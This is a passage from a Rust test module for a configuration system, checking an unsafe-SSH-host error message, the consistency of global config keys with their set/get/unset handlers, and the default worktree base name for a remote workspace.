        assert!(e.to_string().contains("unsafe SSH host"), "{e}");
    }

    #[test]
    fn global_keys_and_accessor_arms_stay_in_sync() {
        // GLOBAL_KEYS only feeds error text; this walk keeps it honest against
        // the match arms — a key listed but unhandled (or vice versa) fails here.
        let mut g = GlobalConfig::default();
        for key in GLOBAL_KEYS {
            g.set(key, "some-value").unwrap_or_else(|e| panic!("set {key}: {e}"));
            assert_eq!(g.get(key).unwrap(), Some("some-value"), "get {key}");
            assert!(g.unset(key).unwrap(), "unset {key}");
            assert_eq!(g.get(key).unwrap(), None, "{key} cleared");
        }
    }

    #[test]
    fn worktree_base_defaults_to_workspace_dir_name() {
        let r = RemoteConfig { connection: "h".into(), workspace_path: None, publish_address: None };
        assert_eq!(r.worktree_base(Path::new("/home/me/myapp")), "myapp");
        let r2 = RemoteConfig { workspace_path: Some("ws/x".into()), ..r };
        assert_eq!(r2.worktree_base(Path::new("/home/me/myapp")), "ws/x");
    }
}
